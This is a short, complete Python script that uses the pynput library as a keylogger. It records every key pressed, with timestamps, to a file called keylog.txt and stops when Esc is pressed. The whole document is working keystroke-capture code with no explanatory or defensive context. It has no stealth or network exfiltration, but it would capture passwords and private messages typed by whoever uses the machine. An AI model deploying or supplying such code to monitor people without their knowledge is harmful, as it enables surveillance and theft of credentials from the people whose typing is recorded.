from pynput import keyboard
import logging

# Set up logging
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        # Log the key pressed
        logging.info(f'Key {key.char} pressed')
    except AttributeError:
        # Special keys (like Ctrl, Alt, etc.) are logged differently
        logging.info(f'Special key {key} pressed')

def on_release(key):
    # Stop listener
    if key == keyboard.Key.esc:
        return False

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()